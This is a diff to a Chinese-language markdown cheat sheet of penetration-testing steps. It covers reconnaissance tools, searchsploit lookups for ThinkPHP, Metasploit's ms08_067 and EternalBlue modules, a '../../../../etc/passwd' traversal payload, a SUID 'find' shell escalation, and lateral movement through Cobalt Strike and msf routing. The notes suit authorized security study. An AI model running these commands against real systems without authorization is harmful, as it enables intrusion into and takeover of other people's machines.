@@ -15,16 +15,26 @@ Web漏洞分析
 
 ## 渗透流程
 1. 信息收集 > fscan/cscan, NMAP > AWVS > Appscan > Burpsuite > x-ray
+1.1 msf > searchsploit thinkphp
+```shell
+  msf > searchsploit thinkphp
+  cd /usr/share/exploitdb/exploits/php/webapps
+  cat 46150.txt
+```
 1.1 cs上线后联动msf, cs 插件 收集域信息
 2. msfconsole
 ```shell
 migrate
 search ms10_018 #(xp的)
 ms08_067 # (445端口, 2008以外系统, KB958644)
+-- ms17_010: 用 AutoBlue-MS17-010见90_tools
 search ms17_010 # (永恒之蓝)
 ```
 3. Web:  kali - web程序 -  ZAP 扫描
-- 3.1 web 目录遍历 `downfile.jsp?filename=fan.pdf` 测试 `../../../../etc/passwd`
+```
+1. vulmap:  python vulmap.py -u http://192.168.50.8:2003/
+2. web 目录遍历 `downfile.jsp?filename=fan.pdf` 测试 `../../../../etc/passwd`
+```
 4. [linux suid find 提权](https://mp.weixin.qq.com/s/8rgvLbOmmjcxVZT7BoW5Og)
 ```shell
 find / -perm -4000 # 如果有find 执行下面
@@ -32,6 +42,7 @@ find ./ aaa -exec '/bin/sh' \;
 ```
 5.横向移动
 msf: 1. autoroute 2.add socks proxy 3.域控
+cs: smb上线其他域
 
 ## MSF
 nmap 探测漏洞
